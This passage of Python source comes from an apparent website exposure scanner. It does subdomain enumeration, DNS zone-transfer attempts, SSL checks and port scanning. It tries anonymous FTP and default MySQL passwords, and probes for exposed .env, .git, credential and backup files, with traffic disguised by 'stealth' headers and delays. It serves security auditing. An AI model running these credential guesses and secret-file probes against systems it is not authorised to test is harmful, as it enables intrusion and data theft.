            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                alert(
                    f"HIGH-VALUE SUBDOMAIN EXPOSED: {label}",
                    "HIGH",
                    fqdn,
                    f"{fqdn} -> {ip} HTTP {status} (discovered via CT logs)"
                )

            check_subdomain_takeover(fqdn)

        except (socket.gaierror, socket.timeout):
            pass
        except Exception as e:
            print_error(f"CT subdomain probe error for {fqdn}: {e}")

    print(timestamp() + f" CT log enumeration complete for {root} — {confirmed} live subdomains confirmed.")

# ─────────────────────────────────────────────
# Technology fingerprinting
# ─────────────────────────────────────────────

def fingerprint_technologies(url, response_headers, html_content):
    detected = []
    try:
        headers_lc = {k.lower(): str(v).lower() for k, v in response_headers.items()} if hasattr(response_headers, 'items') else {}
        html_str = html_content.decode("utf-8", errors="ignore").lower() if isinstance(html_content, bytes) else str(html_content).lower()
        for tech, sigs in TECH_SIGNATURES.items():
            found = False
            for h in sigs["headers"]:
                if ": " in h:
                    hname, hval = h.split(": ", 1)
                    if hval.lower() in headers_lc.get(hname.lower(), ""):
                        found = True
                        break
                else:
                    if h.lower() in headers_lc:
                        found = True
                        break
            if not found:
                found = any(p.lower() in html_str for p in sigs["html"])
            if found:
                detected.append(tech)
        if detected:
            print(timestamp() + " Technologies on " + url + ": " + ", ".join(detected))
            for tech in detected:
                write_to_tech_database(url, tech)
    except Exception as e:
        print_error("fingerprint: " + str(e))
    return detected

# ─────────────────────────────────────────────
# Robots.txt
# ─────────────────────────────────────────────

def fetch_robots_txt(base_url):
    robots_url = urljoin(base_url, "/robots.txt")
    try:
        resp = safe_get(robots_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            content = resp.text
            print(timestamp() + " robots.txt found for " + base_url)
            write_to_robots_database(base_url, content)
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.parse(content.splitlines())
            return rp
        else:
            print(timestamp() + " No robots.txt for " + base_url)
    except Exception as e:
        print_error("robots.txt fetch failed for " + base_url + ": " + str(e))
    return None

def is_allowed_by_robots(rp, url):
    if rp is None:
        return True
    try:
        return rp.can_fetch("*", url)
    except Exception:
        return True

# ─────────────────────────────────────────────
# Sitemap.xml
# ─────────────────────────────────────────────

def fetch_sitemap(base_url):
    urls_found = []
    sitemap_url = urljoin(base_url, "/sitemap.xml")
    try:
        resp = safe_get(sitemap_url, timeout=REQUEST_TIMEOUT)
        if resp and resp.status_code == 200:
            soup = BeautifulSoup(resp.content, "xml")
            locs = soup.find_all("loc")
            total = len(locs)
            for loc in locs[:SITEMAP_CAP]:
                u = loc.text.strip()
                urls_found.append(u)
                write_to_sitemap_database(base_url, u)
            if total > SITEMAP_CAP:
                print(timestamp() + " Sitemap has " + str(total) + " URLs — capped at " + str(SITEMAP_CAP))
            else:
                print(timestamp() + " Sitemap found " + str(total) + " URLs for " + base_url)
        else:
            print(timestamp() + " No sitemap.xml for " + base_url)
    except Exception as e:
        print_error("Sitemap fetch failed: " + str(e))
    return urls_found

# ─────────────────────────────────────────────
# DNS
# ─────────────────────────────────────────────

def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        for ipval in result:
            ip = ipval.to_text()
            print(timestamp() + " DNS " + domain + " → " + ip)
            write_to_dns_database(domain, ip)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("DNS lookup failed for " + domain + ": " + str(e))

def mx_lookup(domain):
    try:
        records = dns.resolver.resolve(domain, 'MX')
        for record in records:
            mx_host = str(record.exchange).rstrip('.')
            preference = record.preference
            print(timestamp() + " MX " + domain + " → " + mx_host + " (pri " + str(preference) + ")")
            write_to_mx_database(domain, mx_host, preference)
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers) as e:
        print_error("MX lookup failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# DNS zone transfer (AXFR)
# ─────────────────────────────────────────────

import dns.zone
import dns.query

_zone_transfer_checked = set()

def attempt_zone_transfer(domain):
    """
    Attempt a DNS zone transfer (AXFR) against every authoritative nameserver
    for the root domain.

    A successful AXFR dumps the entire DNS zone — every subdomain, internal
    host, and IP address — in a single query. Misconfigured nameservers that
    allow this are a CRITICAL finding.

    Uses dnspython's dns.query.xfr() with a hard timeout so it never hangs.
    """
    root = extract_root_domain(domain)
    if root in _zone_transfer_checked:
        return
    _zone_transfer_checked.add(root)

    try:
        ns_records = dns.resolver.resolve(root, 'NS')
        nameservers = [str(r.target).rstrip('.') for r in ns_records]
    except Exception as e:
        print_error(f"NS lookup failed for {root}: {e}")
        return

    print(timestamp() + f" Zone transfer attempt for {root} ({len(nameservers)} nameservers)...")

    for ns in nameservers:
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns, root, timeout=10, lifetime=15))
            # Successful transfer — enumerate all records
            records = []
            for name, node in zone.nodes.items():
                for rdataset in node.rdatasets:
                    rdtype = dns.rdatatype.to_text(rdataset.rdtype)
                    for rdata in rdataset:
                        record_str = f"{name}.{root} {rdtype} {rdata}"
                        records.append(record_str)
                        write_to_zone_transfer_database(root, ns, record_str)

            alert(
                "DNS ZONE TRANSFER ALLOWED (AXFR)",
                "CRITICAL",
                root,
                f"Nameserver {ns} allowed AXFR — {len(records)} records exposed. "
                f"Full DNS zone is publicly downloadable."
            )
            print(timestamp() + f" [!!] Zone transfer succeeded: {ns} → {len(records)} records for {root}")
            return  # One success is definitive — stop probing other NSes

        except (dns.exception.FormError, EOFError, ConnectionResetError):
            # Refused — expected, not an error
            print(timestamp() + f" Zone transfer refused by {ns} for {root}")
        except Exception as e:
            print_error(f"Zone transfer probe failed for {root} via {ns}: {e}")

def write_to_zone_transfer_database(root_domain, nameserver, record):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ZoneTransfer")
        conn.execute(
            "INSERT INTO ZoneTransfer (root_domain,nameserver,record,found_at) VALUES (?,?,?,?)",
            (root_domain, nameserver, record, timestamp()))
    except Exception as e:
        print_error("write_to_zone_transfer_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# SSL
# ─────────────────────────────────────────────

try:
    from cryptography import x509 as _x509
    from cryptography.hazmat.backends import default_backend as _crypto_backend
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False

def get_ssl_info(domain):
    try:
        from datetime import timezone
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert        = ssock.getpeercert()
                issuer      = dict(x[0] for x in cert.get('issuer', []))
                subject     = dict(x[0] for x in cert.get('subject', []))
                issuer_name = issuer.get('organizationName', 'Unknown')
                common_name = subject.get('commonName', 'Unknown')
                not_before  = cert.get('notBefore', 'Unknown')
                not_after   = cert.get('notAfter', 'Unknown')
                print(timestamp() + " SSL " + domain + " expires " + not_after)
                write_to_ssl_database(domain, common_name, issuer_name, not_before, not_after)

                # ── Expiry check ──────────────────────────────────────
                if not_after and not_after != 'Unknown':
                    try:
                        expiry_dt = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                        days_left = (expiry_dt - datetime.now(timezone.utc)).days
                        if days_left < 0:
                            alert(
                                "SSL CERTIFICATE EXPIRED",
                                "CRITICAL",
                                domain,
                                f"Certificate expired {abs(days_left)} days ago ({not_after})"
                            )
                        elif days_left <= 14:
                            alert(
                                "SSL CERTIFICATE EXPIRING SOON",
                                "HIGH",
                                domain,
                                f"Certificate expires in {days_left} days ({not_after})"
                            )
                    except Exception:
                        pass

                # ── Self-signed check ─────────────────────────────────
                # Self-signed: issuer CN/O matches subject CN/O
                issuer_cn = issuer.get('commonName', '')
                subject_cn = subject.get('commonName', '')
                issuer_org = issuer.get('organizationName', '')
                subject_org = subject.get('organizationName', '')
                if issuer_cn and issuer_cn == subject_cn:
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate is self-signed (issuer CN = subject CN = '{issuer_cn}'). "
                        f"Clients cannot verify authenticity."
                    )
                elif issuer_org and issuer_org == subject_org and issuer_org not in ('', 'Unknown'):
                    alert(
                        "SELF-SIGNED SSL CERTIFICATE",
                        "HIGH",
                        domain,
                        f"Certificate appears self-signed (issuer org = subject org = '{issuer_org}')."
                    )

                # ── Deep analysis via cryptography library ────────────
                if _CRYPTO_AVAILABLE:
                    try:
                        raw_cert = ssock.getpeercert(binary_form=True)
                        cert_obj = _x509.load_der_x509_certificate(raw_cert, _crypto_backend())

                        # Signature algorithm — flag SHA1/MD5 as weak
                        sig_alg = cert_obj.signature_hash_algorithm
                        if sig_alg:
                            alg_name = sig_alg.name.lower()
                            if alg_name in ("sha1", "md5", "md2"):
                                alert(
                                    f"WEAK SSL SIGNATURE ALGORITHM: {alg_name.upper()}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses deprecated {alg_name.upper()} signature algorithm. "
                                    f"Vulnerable to collision attacks."
                                )

                        # Public key size — flag RSA/DSA < 2048, EC < 224
                        pub_key = cert_obj.public_key()
                        key_type = type(pub_key).__name__
                        key_size = getattr(pub_key, 'key_size', None)
                        if key_size:
                            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa, dsa as _dsa, ec as _ec
                            if isinstance(pub_key, (_rsa.RSAPublicKey, _dsa.DSAPublicKey)) and key_size < 2048:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit {key_type}",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit key — below recommended 2048-bit minimum."
                                )
                            elif isinstance(pub_key, _ec.EllipticCurvePublicKey) and key_size < 224:
                                alert(
                                    f"WEAK SSL KEY SIZE: {key_size}-bit EC",
                                    "HIGH",
                                    domain,
                                    f"Certificate uses {key_size}-bit elliptic curve key — below recommended 224-bit minimum."
                                )

                        # Subject Alternative Names
                        try:
                            san_ext = cert_obj.extensions.get_extension_for_class(_x509.SubjectAlternativeName)
                            san_names = [str(n.value) for n in san_ext.value]
                            wildcard_sans = [s for s in san_names if s.startswith("*.")]
                            if wildcard_sans:
                                print(timestamp() + f" SSL wildcard SANs on {domain}: {', '.join(wildcard_sans)}")
                            print(timestamp() + f" SSL SANs ({len(san_names)}): {', '.join(san_names[:10])}"
                                  + (" ..." if len(san_names) > 10 else ""))
                        except Exception:
                            pass

                    except Exception as e:
                        print_error(f"SSL deep analysis failed for {domain}: {e}")

    except (ssl.SSLError, socket.timeout, socket.gaierror, ConnectionRefusedError, OSError) as e:
        print_error("SSL failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# WHOIS — threaded with hard timeout
# ─────────────────────────────────────────────

def get_whois_info(domain):
    result = [None]

    def _do():
        try:
            result[0] = whois.whois(domain)
        except Exception as e:
            print_error("WHOIS failed for " + domain + ": " + str(e))

    t = threading.Thread(target=_do, daemon=True)
    t.start()
    t.join(timeout=10)

    if t.is_alive():
        print_error("WHOIS timeout for " + domain)
        return

    w = result[0]
    if not w:
        return

    try:
        registrar       = w.registrar or 'Unknown'
        creation_date   = w.creation_date
        expiration_date = w.expiration_date
        if isinstance(creation_date, list):
            creation_date = creation_date[0]
        if isinstance(expiration_date, list):
            expiration_date = expiration_date[0]
        creation_str   = str(creation_date)   if creation_date   else 'Unknown'
        expiration_str = str(expiration_date) if expiration_date else 'Unknown'
        print(timestamp() + " WHOIS " + domain + " registrar=" + str(registrar))
        write_to_whois_database(domain, str(registrar), creation_str, expiration_str)
    except Exception as e:
        print_error("WHOIS parse failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# Port scanning
# ─────────────────────────────────────────────

def check_ftp_anonymous(host):
    """
    Attempt an anonymous FTP login. Returns True if the server accepts it.
    This is the only condition under which FTP gets a HIGH alert.
    """
    import ftplib
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21)
        ftp.login("anonymous", "anonymous@example.com")
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False   # auth rejected — normal
    except Exception:
        return False

# Default credentials to probe on MySQL — ordered by likelihood
MYSQL_DEFAULT_CREDS = [
    ("root",  ""),
    ("root",  "root"),
    ("root",  "password"),
    ("root",  "mysql"),
    ("mysql", "mysql"),
    ("admin", "admin"),
]

def check_mysql_auth(host):
    """
    Grab the MySQL banner for version recon, then (if pymysql is available)
    attempt a series of default/blank credentials.

    Returns a dict:
      {
        "version":      str | None,   # e.g. "8.0.32"
        "eol":          bool,         # True if major version is 5 or below
        "weak_creds":   (user, pass) | None,  # first working cred pair
        "banner_only":  bool,         # True if pymysql unavailable
      }
    """
    result = {"version": None, "eol": False, "weak_creds": None, "banner_only": False}

    # ── Banner grab (no library needed) ──────────────────────────
    try:
        s = socket.create_connection((host, 3306), timeout=5)
        banner = s.recv(1024)
        s.close()
        if banner and len(banner) > 5:
            # MySQL greeting: [4-byte packet header][1-byte protocol][version\x00...]
            try:
                version_raw = banner[5:].split(b'\x00')[0].decode('utf-8', errors='ignore')
                # Sanity-check it looks like a version string
                if version_raw and version_raw[0].isdigit():
                    result["version"] = version_raw
                    major = version_raw.split('.')[0]
                    if major.isdigit() and int(major) <= 5:
                        result["eol"] = True
            except Exception:
                pass
    except Exception:
        return result  # port open but banner grab failed — nothing more to do

    if not PYMYSQL_AVAILABLE:
        result["banner_only"] = True
        return result

    # ── Auth probe (pymysql) ──────────────────────────────────────
    for user, passwd in MYSQL_DEFAULT_CREDS:
        try:
            conn = pymysql.connect(
                host=host, port=3306, user=user, password=passwd,
                connect_timeout=5, read_timeout=5,
            )
            conn.close()
            result["weak_creds"] = (user, passwd)
            break   # stop at first working pair
        except pymysql.err.OperationalError as e:
            code = e.args[0]
            if code in (1045, 1044):
                continue   # access denied — expected, try next
            break           # unexpected error, stop probing
        except Exception:
            break

    return result

def port_scan(domain):
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        print_error("Port scan failed for " + domain + ": " + str(e))
        return

    def _probe_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            open_ = s.connect_ex((ip, port)) == 0
            s.close()

            if not open_:
                return

            print(timestamp() + " Open port " + str(port) + " on " + domain)
            write_to_ports_database(domain, ip, port)

            if port in CRITICAL_PORTS:
                # These services are dangerous just by being exposed
                svc = CRITICAL_PORTS[port]
                severity = "CRITICAL" if port in {6379, 27017, 23} else "HIGH"
                alert(
                    f"EXPOSED SERVICE: port {port} ({svc})",
                    severity,
                    domain,
                    f"Port {port} ({svc}) is open on {ip}"
                )

            elif port == 3306:
                # MySQL — probe before alerting
                print(timestamp() + " MySQL open on " + domain + " — probing version and auth...")
                mysql = check_mysql_auth(domain)

                if mysql["weak_creds"]:
                    user, passwd = mysql["weak_creds"]
                    disp_pass = f'"{passwd}"' if passwd else "(blank)"
                    alert(
                        "MYSQL DEFAULT CREDENTIALS ACCEPTED",
                        "CRITICAL",
                        domain,
                        f"MySQL on {ip} accepted login: user={user} password={disp_pass}"
                        + (f" — version {mysql['version']}" if mysql["version"] else "")
                    )
                elif mysql["eol"]:
                    alert(
                        "EOL MYSQL VERSION EXPOSED",
                        "HIGH",
                        domain,
                        f"MySQL {mysql['version']} on {ip} is end-of-life and may have unpatched CVEs — auth probe found no default creds"
                    )
                elif mysql["version"]:
                    print(timestamp() + f" MySQL {mysql['version']} on {domain} — auth rejected, no default creds found")
                elif mysql["banner_only"]:
                    print(timestamp() + f" MySQL open on {domain} — install pymysql for auth probing")
                else:
                    print(timestamp() + f" MySQL open on {domain} — banner grab failed, port may be filtered")

            elif port == 21:
                # FTP open is informational — only alert if anonymous login works
                print(timestamp() + " FTP open on " + domain + " — probing anonymous login...")
                if check_ftp_anonymous(domain):
                    alert(
                        "ANONYMOUS FTP LOGIN ACCEPTED",
                        "HIGH",
                        domain,
                        f"Port 21 on {ip} accepts anonymous login — files may be readable/writable without credentials"
                    )
                else:
                    print(timestamp() + " FTP anonymous login rejected on " + domain + " — low risk")

            elif port == 22:
                # SSH open is normal — log it, no alert
                print(timestamp() + " SSH open on " + domain + " (informational)")

        except socket.error:
            pass

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=len(COMMON_PORTS)) as _ex:
        _futs = [_ex.submit(_probe_port, port) for port in COMMON_PORTS]
        for _f in _as_completed(_futs):
            pass

# ─────────────────────────────────────────────
# HTTP response history
# ─────────────────────────────────────────────

def record_http_response(url, status_code):
    print(timestamp() + " HTTP " + str(status_code) + " " + url)
    write_to_http_history_database(url, status_code)


# ─────────────────────────────────────────────
# ASN / CDN detection
# ─────────────────────────────────────────────

# Cache so each IP is only looked up once per crawl session
_asn_cache = {}

# Known CDN/hosting ASN patterns — checked against org field from ipinfo.io
CDN_PATTERNS = {
    "Akamai":      ["akamai"],
    "Cloudflare":  ["cloudflare"],
    "Fastly":      ["fastly"],
    "CloudFront":  ["amazon", "cloudfront", "aws"],
    "Google CDN":  ["google"],
    "Azure CDN":   ["microsoft", "azure"],
    "Incapsula":   ["imperva", "incapsula"],
    "Sucuri":      ["sucuri"],
    "Stackpath":   ["stackpath", "highwinds"],
    "Limelight":   ["limelight"],
    "Edgio":       ["edgio", "limelight"],
    "CDN77":       ["cdn77", "datacamp"],
    "KeyCDN":      ["keycdn", "proofpoint"],
    "Shared Host": ["godaddy", "bluehost", "hostgator", "siteground",
                    "namecheap", "dreamhost", "hostinger", "ionos",
                    "ovh", "liquid web"],
}

def detect_cdn(org_str):
    """Returns (is_cdn, cdn_name) based on org string from ipinfo."""
    if not org_str:
        return False, None
    org_lower = org_str.lower()
    for cdn_name, patterns in CDN_PATTERNS.items():
        if any(p in org_lower for p in patterns):
            return True, cdn_name
    return False, None

def asn_lookup(ip):
    """
    Look up ASN and org info for an IP via ipinfo.io.
    Returns dict with asn, org, country, is_cdn, cdn_name.
    Results are cached per session to avoid hammering the API.
    """
    if not ip or ip == "Unknown":
        return None
    if ip in _asn_cache:
        return _asn_cache[ip]
    try:
        stealth_delay("ipinfo.io")
        resp = requests.get(
            "https://ipinfo.io/" + ip + "/json",
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=5
        )
        if resp.status_code != 200:
            return None
        data = resp.json()
        org     = data.get("org", "")       # e.g. "AS20940 Akamai Technologies, Inc."
        country = data.get("country", "")
        asn     = org.split(" ")[0] if org else ""  # extract "AS20940"
        is_cdn, cdn_name = detect_cdn(org)

        if is_cdn:
            print(timestamp() + " ASN " + ip + " -> " + org + " [CDN: " + cdn_name + "]")
        else:
            print(timestamp() + " ASN " + ip + " -> " + org)

        result = {
            "ip":       ip,
            "asn":      asn,
            "org":      org,
            "country":  country,
            "is_cdn":   is_cdn,
            "cdn_name": cdn_name or "",
        }
        _asn_cache[ip] = result
        write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name or "")
        return result
    except Exception as e:
        print_error("asn_lookup failed for " + ip + ": " + str(e))
        return None

def write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ASN")
        # Only insert if not already stored
        existing = conn.execute("SELECT ip FROM ASN WHERE ip=? LIMIT 1", (ip,)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO ASN (ip,asn,org,country,is_cdn,cdn_name,looked_up) VALUES (?,?,?,?,?,?,?)",
                (ip, asn, org, country, 1 if is_cdn else 0, cdn_name, timestamp()))
    except Exception as e:
        print_error("write_to_asn_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Exposure checks — .git, .env, CORS, directory listing, backup files, SPF/DMARC
# ─────────────────────────────────────────────

# Track checked base URLs so we don't re-probe the same host twice
_exposure_checked = set()

# .env variants worth probing — ordered by likelihood
ENV_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.prod",
    "/.env.staging",
    "/.env.backup",
    "/.env.old",
    "/.env.example",   # sometimes contains real values anyway
    "/config/.env",
    "/app/.env",
]

# Signatures that confirm a real .env file vs. a 200 that's just the homepage
ENV_SIGNATURES = [
    "APP_KEY=", "DB_PASSWORD=", "DB_HOST=", "SECRET_KEY=",
    "AWS_ACCESS_KEY", "API_KEY=", "MAIL_PASSWORD=", "REDIS_PASSWORD=",
    "DATABASE_URL=", "JWT_SECRET=", "STRIPE_SECRET", "TWILIO_",
    "APP_ENV=", "APP_SECRET=", "S3_SECRET",
]

def check_git_exposure(base_url, domain):
    """
    Probe /.git/HEAD — if it returns 200 and looks like a git ref,
    the entire repo may be downloadable.
    """
    try:
        url = base_url.rstrip("/") + "/.git/HEAD"
        resp = safe_get(url, timeout=6)
        if resp and resp.status_code == 200:
            body = resp.text.strip()
            if body.startswith("ref:") or body.startswith("refs/") or len(body) == 40:
                alert(
                    "EXPOSED .GIT DIRECTORY",
                    "CRITICAL",
                    domain,
                    f"/.git/HEAD returned a valid git ref at {url} — source code may be fully downloadable"
                )
                print(timestamp() + " [!!] .git exposed at " + url)
                return True
            else:
                print(timestamp() + " /.git/HEAD returned 200 but content looks wrong — possible false positive on " + domain)
    except Exception as e:
        print_error("check_git_exposure failed for " + domain + ": " + str(e))
    return False

def check_env_exposure(base_url, domain):
    """
    Probe common .env paths. Confirm findings by looking for known .env
    key signatures in the response body — avoids false positives from
    catch-all 200 handlers.
    """
    found = []
    try:
        for path in ENV_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            # Must contain at least one real .env signature to count
            matched_sigs = [sig for sig in ENV_SIGNATURES if sig in body]
            if matched_sigs:
                detail = f"{url} — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED .ENV FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] .env exposed at " + url + " (matched: " + ", ".join(matched_sigs[:3]) + ")")
                found.append(url)
                break  # one confirmed hit is enough — don't hammer the server
    except Exception as e:
        print_error("check_env_exposure failed for " + domain + ": " + str(e))
    return found

# ── Directory listing ──────────────────────────────────────────

# Paths commonly left with directory listing enabled
DIRECTORY_LISTING_PATHS = [
    "/",
    "/uploads/",
    "/upload/",
    "/files/",
    "/backup/",
    "/backups/",
    "/static/",
    "/assets/",
    "/images/",
    "/img/",
    "/media/",
    "/logs/",
    "/tmp/",
    "/temp/",
    "/data/",
    "/admin/",
    "/wp-content/uploads/",
    "/wp-content/backups/",
]

DIRECTORY_LISTING_SIGNATURES = [
    "Index of /",
    "Directory listing for /",
    "Directory of /",
    "<title>Index of",
    "Parent Directory</a>",
    "[To Parent Directory]",
]

def check_directory_listing(base_url, domain):
    """
    Probe common paths for open directory listings.
    Confirms by looking for known server-generated index page signatures.
    """
    found = []
    try:
        for path in DIRECTORY_LISTING_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            matched = [sig for sig in DIRECTORY_LISTING_SIGNATURES if sig in body]
            if matched:
                alert(
                    "DIRECTORY LISTING ENABLED",
                    "HIGH",
                    domain,
                    f"Open directory index at {url} — file tree exposed to public"
                )
                print(timestamp() + " [!!] Directory listing at " + url)
                found.append(url)
    except Exception as e:
        print_error("check_directory_listing failed for " + domain + ": " + str(e))
    return found

# ── Backup / config file exposure ─────────────────────────────

BACKUP_PATHS = [
    # WordPress
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/wp-config.php.old",
    "/wp-config.bak",
    # Generic config
    "/.htpasswd",
    "/.htaccess.bak",
    "/config.php.bak",
    "/config.yml",
    "/config.yaml",
    "/config.json",
    "/configuration.php.bak",
    "/settings.py.bak",
    "/settings.php.bak",
    "/database.yml",
    "/database.php.bak",
    "/db.php.bak",
    # Credentials / secrets
    "/credentials.json",
    "/secrets.yml",
    "/secrets.yaml",
    "/.aws/credentials",
    # SQL dumps
    "/backup.sql",
    "/dump.sql",
    "/db.sql",
    "/database.sql",
    "/backup.sql.gz",
    # Archive dumps
    "/backup.zip",
    "/backup.tar.gz",
    "/www.zip",
    "/site.zip",
    "/htdocs.zip",
    # Logs
    "/error.log",
    "/access.log",
    "/debug.log",
    "/app.log",
    "/laravel.log",
    "/storage/logs/laravel.log",
]

# Signatures that confirm a file is the real thing rather than a 200 catch-all
BACKUP_SIGNATURES = {
    "wp-config": ["DB_NAME", "DB_PASSWORD", "DB_HOST", "table_prefix"],
    ".htpasswd": [":$apr1$", ":$2y$", ":{SHA}", ":$1$"],
    "config.yml": ["database:", "password:", "secret_key:", "api_key:"],
    "config.yaml": ["database:", "password:", "secret_key:", "api_key:"],
    "database.yml": ["adapter:", "username:", "password:", "database:"],
    "credentials": ["aws_access_key_id", "aws_secret_access_key"],
    ".sql": ["INSERT INTO", "CREATE TABLE", "DROP TABLE", "-- MySQL dump", "-- PostgreSQL"],
    "secrets": ["password:", "api_key:", "secret:", "token:"],
    "laravel.log": ["local.ERROR", "Stack trace", "production.ERROR"],
    ".log": ["ERROR", "Exception", "Traceback", "Fatal"],
}

def _backup_signatures_for(path):
    """Return the right signature list for a given path."""
    for key, sigs in BACKUP_SIGNATURES.items():
        if key in path:
            return sigs
    return None  # no signature required — 200 is enough (e.g. zip/tar files)

def check_backup_exposure(base_url, domain):
    """
    Probe for exposed backup and config files.
    For text-based files, confirm with content signatures to avoid
    false positives from catch-all 200 handlers.
    Binary archive files (zip, tar.gz) are flagged on 200 + correct Content-Type alone.
    Catch-all redirects (302 to homepage for every path) are detected and skipped.
    """
    found = []
    try:
        # ── Catch-all detection ───────────────────────────────────
        # Fetch the homepage and a guaranteed-nonexistent path.
        # If both return the same content/redirect destination, this server
        # uses a catch-all — backup file 200s cannot be trusted.
        canary = base_url.rstrip("/") + "/nuscrape-canary-" + str(random.randint(100000, 999999)) + ".php.bak"
        canary_resp = safe_get(canary, timeout=6)
        if canary_resp:
            # If a random nonexistent path returns 200 or redirects to homepage, it's a catch-all
            if canary_resp.status_code == 200:
                print(timestamp() + " Catch-all 200 detected on " + domain + " — skipping backup file probe")
                return found
            if canary_resp.status_code in (301, 302, 303, 307, 308):
                canary_location = canary_resp.headers.get("Location", "")
                if canary_location.rstrip("/") in (base_url.rstrip("/"), "/", ""):
                    print(timestamp() + " Catch-all redirect detected on " + domain + " — skipping backup file probe")
                    return found

        for path in BACKUP_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code not in (200, 206):
                continue

            content_type = resp.headers.get("Content-Type", "").lower()

            # Reject HTML responses — real config/backup files are never text/html
            if "text/html" in content_type:
                continue

            # Binary archives — confirm via Content-Type, no body parse needed
            if path.endswith((".zip", ".tar.gz", ".gz")):
                if any(ct in content_type for ct in ["zip", "octet-stream", "gzip", "x-tar"]):
                    alert(
                        "EXPOSED BACKUP ARCHIVE",
                        "CRITICAL",
                        domain,
                        f"Backup archive served at {url} (Content-Type: {content_type})"
                    )
                    print(timestamp() + " [!!] Backup archive at " + url)
                    found.append(url)
                continue

            # Text files — require signature match
            sigs = _backup_signatures_for(path)
            body = resp.text

            if sigs is None:
                # No signatures defined — 200 alone is the signal
                confirmed = True
                matched_sigs = []
            else:
                matched_sigs = [s for s in sigs if s in body]
                confirmed = bool(matched_sigs)

            if confirmed:
                detail = f"{url}"
                if matched_sigs:
                    detail += f" — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED BACKUP / CONFIG FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] Backup/config exposed at " + url)
                found.append(url)

    except Exception as e:
        print_error("check_backup_exposure failed for " + domain + ": " + str(e))
    return found


# ─────────────────────────────────────────────
# Sensitive file exposure
# ─────────────────────────────────────────────

# (path, severity, description)
SENSITIVE_FILES = [
    # Package / dependency manifests — leak dependency tree and versions
    ("/package.json",          "MEDIUM",   "Node.js package manifest — exposes dependency tree, scripts, and version info"),
    ("/package-lock.json",     "MEDIUM",   "Node.js lockfile — full dependency tree with exact versions"),
    ("/composer.json",         "MEDIUM",   "PHP Composer manifest — exposes dependency tree"),
    ("/composer.lock",         "MEDIUM",   "PHP Composer lockfile — full dependency tree with hashes"),
    ("/Gemfile",               "MEDIUM",   "Ruby Gemfile — exposes dependency tree"),
    ("/Gemfile.lock",          "MEDIUM",   "Ruby Gemfile.lock — full dependency tree"),
    ("/requirements.txt",      "MEDIUM",   "Python requirements — exposes dependency versions"),
    ("/yarn.lock",             "MEDIUM",   "Yarn lockfile — full dependency tree"),
    # Infrastructure / container files — leak architecture
    ("/Dockerfile",            "HIGH",     "Dockerfile exposed — reveals build process, base image, and may contain secrets"),
    ("/docker-compose.yml",    "HIGH",     "docker-compose.yml exposed — reveals service architecture and may contain credentials"),
    ("/docker-compose.yaml",   "HIGH",     "docker-compose.yaml exposed — reveals service architecture and may contain credentials"),
    ("/.dockerenv",            "MEDIUM",   ".dockerenv present — confirms containerised deployment"),
    ("/Makefile",              "MEDIUM",   "Makefile exposed — reveals build commands and internal tooling"),
    # Config / credential files
    ("/.npmrc",                "HIGH",     ".npmrc exposed — may contain npm auth tokens or private registry credentials"),
    ("/.pypirc",               "HIGH",     ".pypirc exposed — may contain PyPI credentials"),
    ("/.htpasswd",             "CRITICAL", ".htpasswd exposed — contains hashed HTTP Basic Auth credentials"),
    ("/web.config",            "HIGH",     "web.config exposed — IIS config may contain connection strings and credentials"),
    ("/config.xml",            "MEDIUM",   "config.xml exposed — may reveal application configuration"),
    ("/config.json",           "MEDIUM",   "config.json exposed — may reveal application configuration or credentials"),
    ("/settings.json",         "MEDIUM",   "settings.json exposed — may reveal application configuration"),
